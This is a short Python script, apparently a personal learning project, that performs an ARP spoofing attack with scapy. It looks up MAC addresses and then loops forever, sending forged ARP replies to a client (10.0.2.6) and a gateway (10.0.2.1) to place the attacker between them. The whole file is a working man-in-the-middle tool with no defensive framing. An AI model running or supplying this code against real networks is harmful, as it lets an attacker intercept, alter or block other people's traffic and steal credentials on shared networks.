#!/usr/bin/env python

"""
************************************************************
Title :       arp_spoofing.py
Author :      Alexis Rodriguez
Created on :  September 1st, 2019
Description : performing an ARP protocol attack
Purpose :     Uses scapy module to reroute requests and
              responses between access point and client machine.
Build with :  python arp_spoofing.py
************************************************************
"""

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_request
    answered_list = scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet_ = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet_)


stop = False
while not stop:
    spoof("10.0.2.6", "10.0.2.1")
    spoof("10.0.2.1", "10.0.2.6")
    time.sleep(2)
